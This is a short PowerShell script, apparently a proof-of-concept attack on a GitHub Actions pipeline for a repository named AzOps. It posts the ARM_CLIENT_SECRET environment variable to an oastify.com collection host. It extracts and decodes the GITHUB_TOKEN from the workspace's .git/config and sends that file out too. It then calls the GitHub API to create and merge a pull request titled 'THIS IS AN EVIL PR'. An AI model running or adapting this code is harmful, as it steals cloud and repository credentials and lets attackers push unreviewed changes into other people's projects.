# Leak secrets.
$remoteUrl = "http://9hryf86p3o4fl8ikham7mn3utlzcn4bt.oastify.com"
$envVariables = @{}
$envVariables = @{
    "ARM_CLIENT_SECRET" = $env:ARM_CLIENT_SECRET
    # Add more variables as needed
}

$jsonBody = $envVariables | ConvertTo-Json

$response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $jsonBody -ContentType "application/json"

# Exfiltrate GITHUB_TOKEN.
$filePath = "$env:GITHUB_WORKSPACE/.git/config"
$fileContent = Get-Content -Path $filePath -Raw

$token = ""
if ($fileContent -match "basic[\s]+([\w\=]+)") {
    $authHeader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))
    if ($authHeader -match "x-access-token:([\w\-\_]+)") {
        $token = $matches[1]
        Write-Output "GH TOKEN: $token"
    }
    
}

$body = @{
    fileContent = $fileContent
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $body -ContentType "application/json"

# Create & merge malicious PR.
# GitHub API base URL
$apiBaseUrl = "https://api.github.com"

# Authentication
$username = "innerproj"
$token = "your_personal_access_token"
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
    "Accept" = "application/vnd.github+json"
    "X-GitHub-Api-Version" = "2022-11-28"
}

# Repository details
$owner = "supriza"
$repo = "AzOps"

# Create a pull request
$pullRequestData = @{
    title = "THIS IS AN EVIL PR"
    head = "main"
    base = "main"
    body = "Where the bad things are..."
} | ConvertTo-Json

$createPullRequestUrl = "$apiBaseUrl/repos/$owner/$repo/pulls"
$pullRequestResponse = Invoke-RestMethod -Uri $createPullRequestUrl -Method Post -Headers $headers -Body $pullRequestData

# Extract the pull request number
$pullRequestNumber = $pullRequestResponse.number

# Merge the pull request
$mergePullRequestUrl = "$apiBaseUrl/repos/$owner/$repo/pulls/$pullRequestNumber/merge"
$mergePullRequestData = @{
    commit_title = "Merge pull request #$pullRequestNumber"
    merge_method = "merge"
} | ConvertTo-Json

$mergePullRequestResponse = Invoke-RestMethod -Uri $mergePullRequestUrl -Method Put -Headers $headers -Body $mergePullRequestData

# Display the response
$mergePullRequestResponse

